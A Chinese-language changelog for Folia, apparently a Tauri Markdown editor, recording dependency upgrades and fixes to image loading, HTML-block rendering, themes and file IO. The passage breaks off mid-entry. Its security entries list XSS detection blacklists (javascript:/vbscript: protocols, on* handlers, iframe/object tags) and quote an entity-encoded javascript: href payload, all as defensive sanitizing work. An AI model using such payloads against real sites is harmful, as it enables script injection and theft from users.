# Changelog

All notable changes of this project will be documented in this file.

## [Unreleased]

### Changed

- **依赖升级批次（ISS-204）**：playwright/@playwright-test 1.60→1.62.1、@tauri-apps/api 2.11.0→2.11.1、@tauri-apps/cli 2.11.1→2.11.4、vitest 4.1.6→4.1.11、docx 9.6.1→9.7.1、mammoth 1.12.0→1.12.2、codemirror 系 4 项（lang-markdown 6.5.2 / state 6.7.1 / view 6.43.9 / react-codemirror 4.25.11）、lucide-react 1.16→1.35.0（15 个在用图标逐一验证在新版存在）、jsdom 29→30.0.1（vitest peer 兼容）。**vditor 保持 3.11.2 不升 3.11.3**：实测其 Lute 内核对多行 SVG 的 IR 拆块算法变更（块级节点 → 部分段落化），打破 ISS-205 SVG 重组逻辑的前提、单测红；迁移待与 vendored 资源同步一并评估。lockfile 随 package.json 同一提交。验证：781/781 单测、typecheck/lint/build、`npm audit` 0 vulnerabilities。

- **TypeScript 全量开启 `strict`（ISS-203）**：`tsconfig.app.json` / `tsconfig.node.json` 开启 `strict: true`；**测试文件从此纳入 typecheck**——此前 `tsconfig.app.json` 把 `*.test.ts(x)` 整体 `exclude`，测试代码从未被 `npm run typecheck` 编译过（盲区）。实测生产代码 96 文件 full strict 零错误，49 条 strict 错误全部落在测试文件：24 个测试文件逐条修类型（未使用 `React` 默认导入 12 处〔jsx: react-jsx 下本就不需要〕、updater/downloadAppUpdate 与 classifyHtmlTableBlocks 等 mock 泛型签名落后于现行 API、docx `rootKey` protected 字段经 unknown 通道断言、TS 控制流对闭包赋值的 never 收窄等），语义零改动、测试意图不变。新增 `config/tsconfig.test.json`（strict + vite/client + node types）接入 `tsc -b` project references，`npm run typecheck` 现覆盖生产 + 测试 + 构建脚本三类代码。验证：781/781 单测、lint/typecheck/build 全绿。附带产出：`npm audit` 恢复可运行（根因为 hermes npm 自带 arborist 8.0.5 的 `edgesOut` 缺陷，改用 homebrew npm 规避，见 TASKS ISS-204 备注）。详见 [DEC-142](docs/DECISIONS.md)。

### Fixed

- **升级 dompurify 3.4.3 → 3.4.14（1 moderate 安全公告）**：`npm audit` 恢复后报告双公告（IN_PLACE 模式经 realm-bound `instanceof` 检查遗留可执行标记 + clobbered root 属性保留，可致 XSS）。Folia 的 sanitize 为主防线（DOMPurify 白名单 + Vditor Lute XSS 过滤），及时跟进。升级后 `npm audit` 0 vulnerabilities；sanitize/导出相关单测全量回归通过（781/781）。package-lock.json 随本批一并提交（review 补：首次提交遗漏 lockfile,`npm ci` 会装回带漏洞的 3.4.3 并缺 @types/jsdom——已修复,`npm ci` dry-run 验证通过）。

- **ISS-200 review 跟进修复：双重弹窗（MAJOR-1）+ 假测试证据撤回（MAJOR-2）+ handleSaveAs 漏网（MINOR-3）**：独立 review（PR #152 合并后送达）发现三处问题并全部修复。(1) **双重弹窗**：fileService 对 oversized / denied-path 错误已弹原生提示后才 throw，而 #152 的 `notifyIoError` 兜底未排除这两类 → 用户对同一错误连看两个对话框。修：fileService 导出 `isAlreadyNotifiedFileError`（pattern 单一事实源），兜底通知前跳过已提示错误。(2) **假测试撤回**：#152 新增的「契约测试」经 review 变异验证为假绿（唯一触发路径 reopen 调用点本就有 catch，不存在 unhandled rejection；删掉修复代码测试照样通过）且被误写入 CHANGELOG 当验收证据——已删除该测试并如实修正 CHANGELOG；另补 `isAlreadyNotifiedFileError` 2 项真实单测（oversized/denied 命中、普通 IO 错误不误判）锁定 MAJOR-1 行为。(3) **handleSaveAs 包 catch**：另存为失败（路径不可写/磁盘满）此前仍 unhandled rejection，与 handleSave 同语义兜底。(4) NIT：handleOpenPath 的 try 收窄到只包 openPath IO 调用（setState/TOC 提取等前端逻辑异常不再误弹「打开文件失败」）。流程教训已沉淀：review 报告未到期间按「diff 复核 + CI」合并的决策路径，在 #152 上被证明不充分——复核聚焦了迁移等价性而漏掉了跨文件交互（fileService 弹提示语义），此后此类双文件交互改动一律等 review。测试：fileService 10/10（+2）；全量见 CI。
- **修复跨窗口事件监听随每次按键重绑、tear-off 场景偶发丢回收事件的问题（ISS-199）**：`useSession` 的跨窗口事件订阅 effect 以 `[state.tabs]` 为依赖——打字每键都触发 cleanup/unlisten + 动态 import + 重新 listen，重绑的异步窗口期可能错过 `window:closed` / `tab:merge-back`（独立窗口关闭后 tab 未被主窗口收回）。修复：tab 快照（`tabsById` / 去重判断 / 移空关窗判断）全部改为 handler 内经 `stateRef` 现算，effect 依赖收敛为 `[]`，一次注册全程存活。**范围取舍**：TASKS 同时提到的 AppLayout 快捷键 effect 同模式重绑经评估**不在本次范围**——其重绑为同步 remove/add（无动态 import、无监听空窗，事件不丢）且 handler 依赖最新闭包是正确语义，ref 化反而破坏 12 个 handler 的依赖追踪。测试：新增 `useSession.rebind.test.tsx`（3 轮 openInNewTab 后四个监听各只注册 1 次；修前实测 4 次）；780/780 全量、typecheck/lint 0 error。
- **修复关窗确认流可被并发击穿 + 文件打开/保存失败用户零反馈的问题（ISS-200）**：(1) 关窗确认流的防重入标志 `closing` 是 effect 局部变量、effect deps 含 tabs——dirty 弹窗期间 autosave 改变 tabs 触发 effect 重绑后标志重置，用户连点红绿灯可并发进入第二条关闭流（孤儿 promise：旧弹窗的 resolve 永远等不到）。提升为组件级 `useRef`（`closingRef`），跨重绑存活。(2) `handleOpenPath` / `handleSave` 无 catch——文件被移走、编码异常、磁盘满等 IO 失败此前全部 unhandled rejection、用户零感知（fileService 只对 oversized/denied-path 两类弹提示）。新增 `notifyIoError` 统一兜底：Tauri 环境弹原生 message（plugin-dialog + i18n 三语新键 `ioErrorTitle`/`ioErrorOpenPrefix`/`ioErrorSavePrefix`，文案含动作前缀与错误详情），非 Tauri 环境 console.error 留痕；提示失败仅记日志不再抛。测试证据见下方 follow-up 条目（原「+1 契约测试」经 review 变异验证为假绿已删除并如实撤回）。
- **修复图片加载失败后诊断 banner 在图片恢复时不消失的问题（ISS-208 / Issue #146）**：编辑器上方的「找不到图片/图片数据损坏」banner 由 img error 事件聚合（DEC-122 Phase 3），但只监听 error——图片资源恢复后（ISS-206 场景：路径修复 / data URL 写回 / 网络图补载）旧错误条目不删除，banner 持续显示误导用户。修法：补对称的 `load` 捕获监听；错误条目与图片的关联采用「元素级 WeakMap 主查找 + src Map 兜底」双索引——过程中抓到两个单测假绿的真 bug：① 重建节点同 src 失败走 seen 去重分支时仅更新 Map 不刷新 aggregate 引用，后续 load 落空（review M2 指出，就地替换收口）；② **error 与 load 之间 img 的 src 会变**（error 时是原始路径，resolver 成功后 setAttribute 写回 data URL，load 携带 data: src），按 src 关联必然 miss——真机复测（tauri dev WKWebView）抓到，单测 dispatch load 前未改写 src 故假绿，修正为元素级主查找后真机判定通过（失败 → TTL 过期 → 文件恢复 → 重载 → 图片渲染 + banner 消失全链路）。测试：+3（同 src 先 error 后 load 清空 / 不同 src 不误清 / 重建+去重+src 变化场景），771/771、typecheck/lint 0 error、CI 双绿。详见 [Issue #146](https://github.com/cat-xierluo/Folia/issues/146)。

- **修复 `$HOME` 之外目录（/tmp、外置卷等）文档的本地图片全部显示「找不到图片/图片数据损坏」的问题（ISS-206 / Issue #138）**：真机实证根因是 Tauri asset 协议 scope 仅 `$HOME/**`（tauri.conf.json assetProtocol），scope 外路径一律 `asset protocol not configured to allow the path` → `<img>` 加载失败。修法：本地媒体解析通路由「convertFileSrc → asset 协议」整体迁移为「**受控 Rust 命令 `read_media_as_data_url` 读字节 → base64 data URL**」——天然不受 asset scope 限制，且与 ISS-201「持久 IO 收敛到自定义命令」同向。命令端四层约束：绝对路径 + `is_denied_root` 黑名单（含 canonicalize 后二次校验，防符号链接逃逸）、扩展名白名单（png/jpg/jpeg/gif/webp/bmp/ico/svg/avif → MIME 映射，任意二进制不可读出）、20MB 大小上限（超限 Err → 前端保留原 src 走占位）、读取失败统一 Err。前端 `localImageResolver` 同步重写：`resolveSingleUrl` 异步化、img/source/poster/srcset/CSS url() 全媒体面走新命令、模块级 path→dataURL 缓存（500 条上限）+ in-flight 并发去重（编辑器高频输入路径同一资源只发生一次 IPC + 读盘）、命令失败保留原 src（既有占位语义不变）；`resolveLocalResourcePath` 的敏感路径守卫（isSensitivePath）在解析层前置不变。覆盖面：相对路径、POSIX/Windows 绝对路径、中文/空格/百分号编码文件名一律支持（任何磁盘位置）。测试：Rust 新增 6 项（正常编码 round-trip / 白名单外拒绝 / 相对路径拒绝 / denied-root / 超限拒绝 / 大小写扩展名）44/44；前端 `localImageResolver.test.ts` 重写为 invoke mock 断言（路径解析正确性 + data URL 写回 + 失败保留原 src + 缓存去重 + 敏感路径不调命令）23/23；全量 764/764、typecheck/lint 0 error。**真机验证（tauri dev WKWebView）**：`/tmp` 绝对路径、`$HOME` 内 fixtures 路径、`/tmp` 相对路径三种写法的 1800×1000 真实尺寸图片全部正常渲染（修复前 /tmp 路径必挂）。已知边界：音视频（mp4 等）不在白名单、>20MB 图片走占位；错误诊断 banner 在图片 src 修复后不自动清除为存量行为（error 聚合列表不随重渲染清空），如感知困扰另行立项。详见 [Issue #138](https://github.com/cat-xierluo/Folia/issues/138)。

- **ISS-205 review 加固（PR #137 合并后 follow-up）**：marker 危险黑名单补强与对齐注入收窄，均源于独立 code review 发现。(1) **黑名单补强 + 实体解码探针**：`containsDangerousHtmlMarker` 新增 meta/base/link/iframe/object/embed/template 标签、formaction/action 属性、vbscript: / data:text/html 协议；属性值内 HTML 实体编码的载荷（`href="&#106;avascript:…"` 经 parser 解码执行）以「真解码探针」复测——只删实体会把 `&#106;avascript:` 断成 ` avascript:` 反而放行；(2) **危险门覆盖 html-inline marker**：`<a …>` 等行内标签在 Lute IR 中是 html-inline 节点，原实现只扫 html-block 整类漏过；(3) **对齐注入收窄**：向含 `data-type` 的特殊 IR 容器（code-block / math-block / yaml-front-matter 等）不再注入 `folia-html-align-*`，避免 text-align 渗入代码字形；内容性元素（p / h1-h6〔无 data-type,仅 data-marker〕/ table 等）不受影响。已知取舍书面化：`\son[a-z]…=` 宽匹配存在良性误判（罕见词形如注释中 `once =`）→ 该 marker 退回 DOMPurify 清洗路径；收紧引号则放行无引号 payload——两害相权取偏检测。单测 +3、更名 1（「快路径不降低安全性」→ 明确为纵深取舍表述）；32/32 通过。


- **修复含多行 HTML 块的 Markdown 在编辑器中「对齐失效 + 浅色横条」，以及一个更严重的源码静默改写问题（ISS-205 / Issue #136）**：用户报告《民事起诉状》落款 `<div align="right">`（标签与内容间有空行的合法 CommonMark 写法，GitHub / Typora 均正常）在 Folia 编辑器中不右对齐，且所有含多行 HTML 的文档出现「比纸面更浅颜色的背景」横条。根因：Vditor IR 模式内核 Lute 生成编辑器 DOM 时**按空行把一个 HTML block 拆成多个独立节点**（ISS-63 已知行为，彼时仅对 `<svg>` 做了重组）。拆块产生两个显示问题——孤立开/闭标签节点的 preview 渲染为空却仍占 `min-height:27px` + `--surface` 底色（即浅色横条）；中间段落升为编辑器顶层直接子元素、脱离 div 祖先链，`align` 失效（落款左对齐）。排查中还发现并修复了一个数据损坏级存量缺陷：`sanitizeVditorIrHtml` 对 html-block marker 文本走 DOMPurify 结构级清洗，其树构建会把孤立开标签**补全闭合、把孤立闭标签直接丢弃**——用户在编辑器内任何触发 sanitize 的操作后再保存，磁盘源码就被静默改写为语义损坏形式（div 提前闭合 + 闭标签丢失）。修法三件套：(1) **marker 保真快路径**——不含危险特征（script/on*/危险协议等文本级黑名单，同 `containsDangerousSvgMarkup` 取舍模式）的 marker 逐字直通，不再进入 DOMPurify 树构建；危险 marker 仍走结构级清洗，主防线（preview 层整体 DOMPurify + hasRemovedUnsafeContent 门控）不变；(2) **包裹组视觉重组**——新增 `repairSplitWrapperHtmlIrPreviews` 识别「纯包裹开标签 + 中间块级内容 + 配对闭标签」被拆散组（白名单 div/p/section/blockquote；兼容 wasm 原生与 app 序列化两种 marker 形态），孤立开/闭节点整体隐藏（`folia-ir-html-wrap-hidden`，同 SVG fragment 先例），悬挂开标签 give-up 不动；IR DOM 保持线性结构不动 round-trip；(3) **对齐还原**——从开标签解析 `align` 向组内中间块级元素注入 `folia-html-align-right/center/left` class 由 CSS 恢复 text-align（class 注入的 round-trip 安全性由 folia-ir-svg-root 先例 + 单测锁定）。预览/导出路径本就不受影响（Lute 连续 HTML 输出嵌套完整）。测试：service 层新增 8 项单测（包裹组隐藏 + 对齐注入、center 场景、无 align 仅隐藏、悬挂开标签 give-up、重复调用幂等、干净 marker 逐字保真锁 round-trip、危险 marker 仍剥除）；新增 e2e `wysiwyg-html-wrapper-align.spec.ts` 2 项（具状人段落 computed `text-align:right` + 自足 center 块不受影响、空 content html-block 可见高度为 0 + marker 源码完整性）。验收：`npm test` 756/756、typecheck/lint 0 error、e2e 全量 76 passed（31 个失败均为 main 既有的无 session 冷启动基线，失败点为最外层编辑器存在性断言，与本修复无交集）。真机验证（tauri dev WKWebView）：打开真实《民事起诉状》落款「具状人：武景怡 / 2026年 月 日」恢复右对齐、两条浅色横条消失、标题居中保持；complex-svg-features fixture（defs/marker/渐变）渲染正常无回归。详见 [Issue #136](https://github.com/cat-xierluo/Folia/issues/136)。

- **修复听悟等转录/导出工具生成的 Markdown「插图不渲染」（整段 `![…](…)` 显示为原始文本）的问题（ISS-194）**：用户报告打开含 `![PPT 幻灯片 1](./260815 Agent + Skill：法律工作的AI变革-杨卫薪律师_slides/slide_001.webp)` 的课程转录文档时，94 张幻灯片截图全部不显示。根因不在图片解析链路（`localImageResolver` → `convertFileSrc` → asset 协议均正常），而在更前一层：**图片目标地址内含未转义空格**。CommonMark 规定非 `<>` 包裹的行内图片目标地址不允许出现空格（空格即目标结束、其后内容无法构成合法 title，整个构造解析失败），Vditor 的 Lute 引擎严格遵循规范——这类「图片」整段按普通文本输出、不产生 `<img>` 节点，后续相对路径解析无从处理。已用 vendored `lute.min.js` 对用户原文件实测：归一化前渲染 `<img>` 数为 0。修法：新增 `markdownImagePathNormalizer` 纯函数服务，在 `fileService.openPath` 的 markdown 分支（打开对话框 / 外部修改自动重载 / 系统「打开方式」三条读盘路径的唯一收口）把图片目标里的**未转义**空格 / Tab 百分号编码为 `%20` / `%09`。选 `%20` 而非 `<…>` 包裹：与 Lute 自身序列化行为一致（编辑器 IR 往返无二次 diff），且是任何严格解析器（GitHub / VS Code / cmark）都可解析的合法形式，URL 解码后与原路径语义一致。保守边界：围栏代码块（\`\`\` / ~~~）与行内代码 span 内容逐字节保留；`<>` 包裹、空格已 `\` 转义、`\![` 字面构造均不动；只处理图片不碰普通链接；幂等。落盘语义：`content` 与 `lastSavedContent` 同步取归一化结果，打开不误标 dirty；用户不编辑则磁盘永不重写，编辑保存时落盘等价且严格合法的 Markdown。测试：新增 25 项归一化单测（17 主用例：含用户文档原始行、围栏/行内代码保留、title 保留、平衡括号扫描、幂等、`<>` 包裹 / `\ ` 转义 / `\![` 字面 / 跨行未闭合 / 外部 URL 等；4 项回归守卫：「原本正常的图片构造逐字节保留」「绝对路径含空格同样归一化」「目标携带 query / fragment」「混合文档坏图修复好图不动」；4 项 CRLF 换行守卫——PR #131 review 修复：CRLF 文档围栏正确闭合、`\r` 逐字节保留不顺手改写 LF）+ `fileService` 2 项（归一化接入 + HTML 不经处理）+ `resolveLocalResourcePath` 1 项（%20 解码后拼目录的链路守卫）；`npm test` 749/749、`typecheck` / `lint` 0 error、`npm run build` 0 error。用户原文件端到端实测：归一化后 94/94 张幻灯片全部渲染为 `<img>`。**真机验证（NOT_VERIFIED，移交用户）**：WKWebView 内实际显示须 `tauri dev` / release 构建打开该转录文档确认（Web 层 Lute 渲染已证，asset URL 装载链路已有单测与 v0.6.7 http 图片先例）。详见 [DEC-140](docs/DECISIONS.md)。

## [0.7.1] - 2026-08-15

### Fixed

- **修复鼠标悬停正文时编辑器右上角常驻「复制」按钮的问题（ISS-190 回归，v0.7.0 用户报告）**：根因是 Vditor IR 模式整个编辑表面就是 `<pre class="vditor-reset">`（`vditor/src/ts/ir/index.ts:37`），`codeBlockCopyService.findCopyableCodeBlock` 之前只排除了 `vditor-ir__marker`（源码 marker）未排除编辑面——`closest('pre')` 从任意正文段落冒泡命中编辑面，其深层 `querySelector('code')` 又能找到文档中任意内联 code，整个编辑面被误判为「代码块」，按钮按编辑面几何（全宽贴顶）吸附在 pane 右上角常驻。修法（纵深防御）：新增 `vditor-reset` 排除 + `querySelector(':scope > code')` 直接子元素门（容器型 pre 内的深层 code 一律不命中）。测试：service 层新增 3 个用例（finder 2 个 + attach 1 个，后者直接复现「hover 编辑面正文 → 按钮不显示」原始症状），TDD 红→绿；`WysiwygEditorPane.test.tsx` Vditor mock 的 IR pre 同步加 `className='vditor-reset'` 真实化，让该排除逻辑成为持续守卫。e2e `theme-ui-visual-guards` 既有 4 项守卫（含真实代码块 hover 复制链路）全过，确认真实代码块复制不受影响。

- **修复切换外观（深色↔亮色）偶发卡顿的问题（ISS-191 回归，v0.7.0 用户报告）**：根因是 v0.7.0 让 `Vditor.preview.theme.current` 跟随 `themePreset.isDark` 且两处 effect deps 含 `isDark`——主题切换触发整销毁重建 Vditor 编辑器 / 重渲 `Vditor.preview`（destroy + 重新 setValue 全文档 + 重跑 mermaid 等异步渲染器，丢滚动位置 / 光标 / 撤销历史），大文档上体感为明显卡顿。而该配置实为零视觉收益的死配置：`setContentTheme` 在 `path:''` 时直接 return（`vditor/dist/index.js:4047`）；编辑器 `mermaidRender`/`chartRender` 读顶层 `options.theme`、预览读硬编码 `mode:'light'`，均与 `preview.theme.current` 无关；主题视觉本就由根节点 CSS 变量即时切换（`html[data-theme='dark']`）。修法：两处 `preview.theme.current` 改常量 `'light'`（保留 `path:''` 抑制 CDN content-theme CSS 加载）、effect deps 移除 `themePreset.isDark`、清理无用 import。测试：`WysiwygEditorPane` + `PreviewPane` 各 1 个对称集成测试（localStorage 切 `themeId` 后断言 Vditor 构造/preview 调用次数不变），TDD 红→绿；716/716 单测绿。真机（vite dev + Playwright）：切深色后 IR 内部段落节点存活（未重建）、hover 正文 `opacity=0`（按钮不误显）。**WKWebView 真机观感（NOT_VERIFIED）**：切主题瞬时无感与大文档不丢滚动位置的主观观感须 `tauri dev` 真机确认，DOM 层已证未重建。详见 [DEC-139](docs/DECISIONS.md)。

- **修复 Markdown 用 POSIX/Windows 绝对路径引用本地图片时显示「图片数据损坏，图片字节可能不完整或格式不受支持」（ISS-127 / PR #128）**：根因是 `src/services/htmlPresentationService.ts:resolveLocalResourcePath` 经 `isRelativeLocalUrl()` 判定路径类型，但排除规则只检查 scheme `:` / `#` / `//`，没排除 POSIX `/` 开头 —— macOS 上常见的 `![alt](/Users/.../xxx.png)` 漏判，走进「目录拼接」分支、被错误拼成 `/Users/.../note.md/Users/.../xxx.png`。该无效路径经 `convertFileSrc()` 转成 `asset://localhost/<bogus>`，`<img>` 加载失败，因 src 以 `asset:` 开头被 `WysiwygEditorPane.classifyError` 归类为 `decode-failed`、触发 `MediaPlaceholder` "图片数据损坏" 占位。本次在 `resolveLocalResourcePath` 入口识别 POSIX（`startsWith('/') && !startsWith('//')` 排除 protocol-relative URL）和 Windows（`/^[A-Za-z]:\//`）绝对路径，命中后跳过目录拼接、直接返回解码后的资源路径，仍走 `isSensitivePath` 守卫保护（防止恶意 md 通过 asset 协议探查 `/etc` / `~/.ssh`）。`usesWindowsSeparators` 改由 `resourceUrl` 自身决定（绝对路径场景下 filePath 不可信）。新增 4 项 vitest（htmlPresentationService 3 + localImageResolver 1）覆盖 POSIX/Windows 绝对路径 + 敏感路径拒绝 + 集成路径不拼接 markdown 目录；`npm test` 715/715 PASS、`typecheck` / `lint` 0 error。**真机 Tauri runtime 验证（NOT_VERIFIED，移交用户）**：`resolveLocalResourcePath` 是纯函数、单元测试已精确断言输出；`convertFileSrc` + `asset://` 协议由 Tauri runtime 提供，不在本修复范围。建议用户在 macOS Folia 里打开含 `![alt](/Users/<your-path>/xxx.png)` 的 markdown 确认图片正常显示。

## [0.7.0] - 2026-08-14

### Added

- **代码块复制按钮（ISS-190）**：主编辑器（即时渲染 IR）与 HTML 预览面板的代码块（`<pre><code>`）在鼠标悬停时，右上角淡入「复制」按钮，点击把代码纯文本写入剪贴板，并在 ~1.5s 内显示「已复制」反馈后复位。复制走 `clipboardService.writeText`（`navigator.clipboard.writeText` 优先，失败降级 `document.execCommand('copy')`）。**挂载方式铁律**：新增 `codeBlockCopyService` **绝不使用 MutationObserver**——仅用 `mouseover/mouseout` 事件委托 + `scroll`（capture）+ `ResizeObserver` 按 `getBoundingClientRect` 做几何跟随定位；按钮挂在独立的 overlay 层（与编辑器 host / 预览 article-shell 同级），**绝不进入 Vditor IR DOM**，避免被 `editor.getValue()` 经 Lute 反序列化写回 markdown 污染文档、或被 sanitize 重写。富媒体（mermaid/echarts/math 等异步渲染语言）重渲染把当前代码块替换掉时，下一次几何重算发现 `pre.isConnected === false` 自动隐藏按钮，不残留、不抖动；mermaid 等图表块本身不出复制按钮（避免复制出 SVG 标记）。Word 纸张预览面不含按钮（仅文本面）。新增 `codeBlockCopyService` 14 项单测（hover 出现 / 点击复制 / 反馈复位 / 富媒体重渲染不残留 / 静态断言无 `new MutationObserver`）+ `WysiwygEditorPane` 2 项集成测试。验收门：typecheck / lint / 613 单测 / build 全绿。**真机验证（NOT_VERIFIED）**：WKWebView 内 hover 淡入与几何跟随的真实观感、真实剪贴板写入须在 `tauri dev` 下由真机确认；jsdom 下 `getBoundingClientRect` 全零，单测通过 mock 固定矩形覆盖定位逻辑。**e2e 收口（v0.7.0 发布后，`e2e/theme-ui-visual-guards.spec.ts`）**：chromium 已验证 hover 淡入（`is-visible` class）、按钮绝不进入 Vditor IR DOM（overlay 铁律）、点击后 `is-copied` 反馈与「已复制」文案、`navigator.clipboard` 真实剪贴板内容等于代码块纯文本（grant clipboard-read/write 权限）。真机剩余收窄为：WKWebView 的剪贴板写入与观感。

- **设置「通用」页新增「设为默认 Markdown 应用」按钮**（#118，ISS-192）：此前已在 `tauri.conf.json` 声明 `.md` / `.markdown` 文件关联，安装 Folia 后系统「知道」它能打开 Markdown，但不会自动把 Folia 设为默认——默认仍是用户既有编辑器。本次在设置页「通用」分区新增按钮，一键把 Folia 注册为系统 .md / .markdown 文件的默认打开程序：macOS 新增 Rust 命令 `set_as_default_markdown_app`，用 `std::process::Command` 调 `osascript` 执行 JXA，通过 `ObjC.import('CoreServices')` 调 `LSSetDefaultRoleHandlerForContentType`，把 UTI `net.daringfireball.markdown`（覆盖 .md / .markdown）的默认 handler 指向本应用 bundle id（取自 `tauri.conf.json` identifier）。用 `std::process::Command` 而非 Tauri shell plugin，避免在 capabilities 引入 shell 执行权限（最小权限面）。非 macOS（Windows/Linux）后端返回 `unsupported` 哨兵串，前端展示「打开系统默认应用设置」的引导文案而非报错。前端新增 `defaultAppService`（invoke 封装 + success/unsupported/error 三态归类）、`GeneralSection` 按钮 + 结果消息、`i18n` 中/英/日文案。单测：Rust 端 `build_set_default_markdown_jxa` 纯函数断言脚本内容（bundle id / UTI 注入、单引号转义、哨兵串稳定性）；前端 `defaultAppService.test`（6 case）+ `GeneralSection.test`（5 case）覆盖三态映射与 UI 展示。**NOT_VERIFIED**：osascript 经 `LSSetDefaultRoleHandlerForContentType` 真正改变系统默认应用须真机验证（已确认 osascript 能解析该函数为合法 function、脚本构造正确、前端三态映射与 UI 展示，但「双击 .md 由 Folia 打开」这一端到端行为未在真机确认）。详见 [DEC-137](docs/DECISIONS.md)。

- **主题系统（ISS-191 / #123，Issue #123，DEC-137）**：内置 6 套主题（浅色 / 羊皮纸 Sepia / 青纸 Sage / 深色 / 夜墨 Ink / 古典 Classic）+ 自定义 CSS 导入（复用 HTML 导出预设的「槽位 + license」机制，标准 2 个、内测码扩容到 8 个，制造「来要邀请码」的自然连接点，与 ROADMAP v0.8 预设生态对齐）。主题切换即时生效、重启保留；CSS 安全 sanitize（剥 `@import` / `url(javascript:/vbscript:/data:text/html)` / `expression(` / `-moz-binding` / `behavior:`，选择器不限），堵住未来组织共享主题的攻击面。**作用范围严格限定阅读写作环境**（app 外壳 + 主编辑器 WYSIWYG + 阅读 PreviewPane，CSS 变量注入到根 div + `<style data-folia-theme>` elementCss + `documentElement.dataset.theme`/`colorScheme` 跟随 `isDark`，Vditor `theme.current` 跟随 → hljs/toolbar 配色随深色切换）；导出面（公众号 HTML 预览 / Word 纸张 / HTML 演示 iframe）天然不消费主题变量，加 e2e 守卫断言「切深色后公众号预览文章体仍白底」防渗漏。**CSS 变量契约细化**：`--link` / `--code-bg` / `--code-block-bg` / `--code-block-text` / `--blockquote-border` / `--blockquote-bg` / `--table-header-bg` / `--selection-bg` / `--highlight-bg` 全部从 `:root` 现有变量派生并拆分独立控制，默认 fallback 保证向后兼容。**6 套主题 oklch 配色**严格按设计文档第 4 节表（参考同类 Markdown 编辑器取变量契约细化与多元护眼取向，不照搬花哨强调色，保持 Folia oklch 暖中性 + 砖红 accent 法律调性；深色/夜墨用更亮暖琥珀保证暗底对比度，古典用更深砖红 + 衬线 elementCss）。`theme` 字段从 `'light'|'dark'` 枚举升级为 `themeId: string`（`'builtin:light'|'builtin:sepia'|'builtin:sage'|'builtin:dark'|'builtin:ink'|'builtin:classic'|'custom:xxx'`），旧值经 `migrateLegacySettings` 平滑迁移。新增 `src/services/themePresets.ts`（类型 + BUILT_IN_THEME_PRESETS + normalize/list/getThemePresetDefinition/fallback builtin:light）、`src/services/themeCssSanitize.ts`（纯函数 sanitize）。`settingsService.ts` 加 `themeId` / `customThemePresets` / `disabledThemePresetIds` + 槽位函数 `getCustomThemePresetCount/Limit/canAdd/add（抛 CustomThemePresetLimitError）/remove/setEnabled`，镜像 `customHtmlExportPresets` 链路（`:899-951`）。`licenseService.ts` 加 `customThemePresetLimit`（`STANDARD_PRESET_SLOT_LIMIT=2` / `LOCAL_BETA_CODES.YWXLAW=8`）。`src/app/AppLayout.tsx` 注入点照搬 `appStyle` 字体栈模式（`src/app/AppLayout.tsx:1338-1342` 现有 `--reading-font-family` 等变量位置追加 `...themePreset.variables`）。`src/components/settings/AppearanceSection.tsx` 从 48 行扩成 ExportSection 那样的二级页（6 内置色卡网格 + 自定义槽位 `{count}/{limit}` + 导入 `.css`/停用/删除/重命名 + license 锁定行 `onOpenLicense` + 切主题即时预览）。`src/services/i18n.ts` 三语主题文案齐全（`themeBuiltin*` / `themeCustom*` / `themeImport*` / `themePreviewAria` / `themeLock*` 等；同步把 `AppearanceSection` 原有硬编码中文接入 i18n）。验收门：`npm run typecheck` 0 error / `npm run lint` 0 error / `npm test` 709/709（Wave 1 契约层 +78 单测 + Wave 2-A/B 整合 6 单测 + 既有 631；PM 修复 `CustomThemePreset` 导入路径 + `BUILT_IN_NAME_KEYS` 类型 + `AppearanceSection` `{false && ...}` lint + `SettingsPage` mock 缺 `default`）/ `npm run build` 成功 / `e2e/theme-system-guards.spec.ts` 2/2（`isDarkColor` 兼容 oklch 不仅是 rgb；第一个测试需预置 markdown session 避免 dev 冷启动欢迎页；导出面不渗漏硬门禁）。**真机验证（NOT_VERIFIED，移交用户）**：WKWebView 内 6 套主题观感、Vditor 代码高亮跟随深色、自定义 CSS 导入与 sanitize 反馈、license 锁定行跳转引导、重启保留选择 —— release 构建各跑一次（按 [project-folia-realapp-verify](memory) `tauri dev` + orca computer 驱动）。详见 [DEC-137](docs/DECISIONS.md)。**e2e 视觉守卫（v0.7.0 发布后收口，`e2e/theme-ui-visual-guards.spec.ts` 4 项）**：vite dev + Playwright 已验证 Web 层全部交互链路——6 套主题卡真实渲染（`getComputedStyle` 断言 className→CSS 生效，防「PR #125 类」裸渲染回归）、逐套切换断言根 div CSS 变量注入与 `data-theme`/`colorScheme` 的 isDark 映射、古典主题 elementCss 非空、reload 后主题保留、自定义 CSS 导入全链路（槽位计数 0/2→1/2、sanitize 剥 `@import` 留正常规则、elementCss 注入）、license 锁定行存在且点击跳转内测授权栏目。真机剩余收窄为：仅 WKWebView 内 6 套主题观感与 Vditor 高亮跟随（主观观感项，DOM 层已证）。

- **演示面板「刷新」「全屏」按钮（ISS-193 / #116, #117）**：HTML 演示面板工具栏新增「刷新」按钮（重置 inlinedSrcDoc 缓存 + 自增 refreshToken 触发 srcDoc 重建、本地资源路径重新走 `createHtmlPresentationDocumentWithLocalResources` 内联、iframe key 变化重新挂载重新加载内容）与「全屏」按钮（iframe `allow="fullscreen"` + `iframe.requestFullscreen()`；PR #117 review 修复原 `iframe.contentWindow.requestFullscreen()` 死代码——Fullscreen API 在 Element 上不在 Window，真实环境恒走父容器回退，改为 iframe 元素本体全屏幻灯片而非整个面板含工具栏）。i18n 新增 `htmlPresentationRefreshLabel` / `htmlPresentationFullscreenLabel`（zh/en/ja 三语）。单测覆盖刷新触发 iframe 重挂载 + srcDoc 重建、全屏走 iframe 元素路径。

- **外部修改自动刷新 + dirty 抑制窗口（ISS-188/189 / #122）**：**ISS-188** 设置页新增「外部修改时自动刷新」开关（默认开），订阅 `fileWatchService.onWatchChanged`，modify 事件经 150ms 防抖 → 非 dirty tab 自动 `openPath` 读盘重载（走 ISS-189 抑制窗口不污染 dirty），dirty tab 仅提示「文件已在外部修改」+「放弃本地并重载 / 忽略」按钮不静默覆盖，create/remove 不自动 reload。**ISS-189** 新增 `dirtySuppression` 服务（`applyWithSuppression` / `isSuppressed`），窗口 350ms > Vditor `markdownUpdated` 200ms 防抖；`AppLayout.handleContentChange` 入口 + `WysiwygEditorPane` 三处 `setValue` 全部包抑制窗口，程序性写入不再被误判为用户编辑触发 dirty/自动保存。review MAJOR 修复：dirtySuppression 窗口改 `suppressedUntil` 时间戳自然过期（删 finally/microtask，microtask 远早于 Vditor 200ms 防抖跑导致窗口失效，改时间戳真正覆盖 200ms 防抖回调）；reload race 用 `activeTabIdRef` 校验 await 后 tab 是否切走，避免把 tab-A 内容写到 